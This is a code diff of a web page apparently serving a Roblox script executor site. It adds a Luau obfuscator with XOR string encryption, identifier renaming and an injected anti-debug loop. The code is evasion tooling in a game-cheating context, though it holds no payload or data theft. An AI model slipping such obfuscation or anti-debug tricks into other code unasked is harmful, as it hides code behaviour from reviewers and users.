-      src="https://raw.githubusercontent.com/Syr0nix/RedFoxScripts.com/refs/heads/main/%7B2CA209B1-4839-4547-A0BB-F392DA76E091%7D.png" 
-      alt="RedFox Executor Preview" 
-      style="max-width: 600px; width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.3);" 
-    />
-  </div>
-</section>
+        function copyMonacoContent(editorInstance, successMessage) {
+            const content = editorInstance.getValue();
+            if (!content || content.trim() === '') {
+                showToast('❌ Nothing to copy!');
+                return;
+            }
+            navigator.clipboard.writeText(content)
+                .then(() => showToast(`📋 ${successMessage}`))
+                .catch(() => showToast('❌ Failed to copy!'));
+        }
 
-    <!-- Obfuscator Tab -->
- <section id="obfuscator" class="section">
-  <h2>Luau Obfuscator</h2>
-  <textarea id="luauInput" placeholder="Enter your Luau script here..."></textarea>
-  <button class="download-btn" onclick="obfuscateLuau()">Obfuscate</button>
-  <div id="obfuscatorOutput" class="output-box hidden"></div>
-</section>
+        // === ADVANCED OBFUSCATOR ===
+        function obfuscateLuau() {
+            // FIXED: Added .trim() to ensure whitespace-only input is caught.
+            const code = inputEditor.getValue().trim();
+            if (!code || code === '-- Paste your Luau script here...') {
+                return showToast("Please enter a script to obfuscate.");
+            }
 
-    
-    <div id="versionTag">Loading version...</div>
-  </main>
+            const options = {
+                encryptStrings: document.getElementById('opt-str-encrypt').checked,
+                renameVars: document.getElementById('opt-var-rename').checked,
+                antiDebug: document.getElementById('opt-anti-debug').checked,
+            };
 
-  <script src="main.js"></script>
+            try {
+                // Using setTimeout to allow the UI to update before a potentially blocking operation
+                setTimeout(() => {
+                    const obfuscated = fullObfuscateLuau(code, options);
+                    outputEditor.setValue(obfuscated);
+                    showToast("✅ Script obfuscated successfully!");
+                }, 10);
+            } catch (e) {
+                console.error("Obfuscation Error:", e);
+                showToast("Error during obfuscation: " + e.message);
+                outputEditor.setValue(`-- OBFUSCATION FAILED:\n-- ${e.message}`);
+            }
+        }
+
+        function fullObfuscateLuau(code, options) {
+            let obf = code;
+            const key = generateRandomName(12);
+            const decryptName = generateRandomName(8);
+            
+            if (options.encryptStrings) {
+                const decryptor = generateRuntimeDecryptor(key, decryptName);
+                obf = encryptStringsInCode(obf, key, decryptName);
+                obf = `${decryptor}\n\n${obf}`;
+            }
+
+            if (options.renameVars) obf = renameLocalIdentifiers(obf);
+            if (options.antiDebug) obf = `${generateAntiDebug()}\n${obf}`;
+
+            return `-- Obfuscated with RedFox\n-- https://redfoxscripts.com\n\n${obf.trim()}`;
+        }
+
+        function generateRandomName(len = 8) {
+            const chars = 'Il';
+            let name = '';
+            for (let i = 0; i < len; i++) name += chars.charAt(Math.floor(Math.random() * chars.length));
+            return '_' + name;
+        }
+
+        function renameLocalIdentifiers(code) {
+            const keywords = new Set(['and','break','do','else','elseif','end','false','for','function','if','in','local','nil','not','or','repeat','return','then','true','until','while','continue','game','workspace','script','print','wait','task','Instance','Vector3','CFrame','Color3','UDim2','BrickColor','Enum','os','math','string','table','coroutine','bit32','utf8',]);
+            const declarations = new Map();
+            const usedNames = new Set(keywords);
+            
+            const findDeclarations = (regex, codeToScan) => { 
+                let match; 
+                while ((match = regex.exec(codeToScan)) !== null) {
+                    if(match[1]) {
+                        match[1].split(',').forEach(n => { 
+                            const t = n.trim(); 
+                            if (t && !keywords.has(t) && !declarations.has(t)) { 
+                                let newName; 
+                                do { newName = generateRandomName(); } while (usedNames.has(newName)); 
+                                usedNames.add(newName); 
+                                declarations.set(t, newName); 
+                            } 
+                        });
+                    }
+                }
+            };
+            
+            findDeclarations(/\blocal\s+(?:function\s+)?([a-zA-Z_]\w*(?:\s*,\s*[a-zA-Z_]\w*)*)/g, code);
+            findDeclarations(/function\s*(?:[a-zA-Z_]\w*\s*)?\(([^)]*)\)/g, code);
+            findDeclarations(/for\s+([a-zA-Z_]\w*(?:\s*,\s*[a-zA-Z_]\w*)*)\s+in/g, code);
+
+            let obfuscatedCode = code; 
+            declarations.forEach((newName, oldName) => { 
+                const regex = new RegExp(`\\b${oldName}\\b`, 'g'); 
+                obfuscatedCode = obfuscatedCode.replace(regex, newName); 
+            }); 
+            return obfuscatedCode;
+        }
+
+        function generateRuntimeDecryptor(key, funcName) {
+            return `local function ${funcName}(s) local k="${key}" local r="" for i=1,#s do r=r..string.char(bit32.bxor(s:byte(i),k:byte((i-1)%#k+1))) end return r end`;
+        }
+        
+        function encryptStringsInCode(code, key, decryptName) {
+            return code.replace(/"((?:[^"\\]|\\.)*)"|'((?:[^'\\]|\\.)*)'/g, (_, dblStr, snglStr) => {
+                if (dblStr === null && snglStr === null) return '';
+                const str = (dblStr !== undefined ? dblStr.replace(/\\"/g, '"').replace(/\\\\/g, '\\') : snglStr.replace(/\\'/g, "'").replace(/\\\\/g, '\\'));
+
+                let encryptedBytes = '';
+                for (let i = 0; i < str.length; i++) {
+                    const charCode = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+                    encryptedBytes += '\\' + charCode;
+                }
+                return `${decryptName}("${encryptedBytes}")`;
+            });
+        }
+        
+        function generateAntiDebug() { return `task.spawn(function() local a=os.clock() while task.wait(0.5) do if(os.clock()-a)>1.5 then getfenv(0).game=nil;error('Debugger Detected') end;a=os.clock() end end)`; }
+        
+        function checkForUpdate() { 
+            fetch("https://raw.githubusercontent.com/Syr0nix/RedFoxScripts.com/main/version.txt?t=" + Date.now())
+                .then(r => r.ok ? r.text() : Promise.reject('Network response was not ok.'))
+                .then(v => { document.getElementById("versionTag").textContent = "v" + v.trim(); })
+                .catch(() => { document.getElementById("versionTag").textContent = "v-unknown"; }); 
+        }
+    </script>
 </body>
 </html>
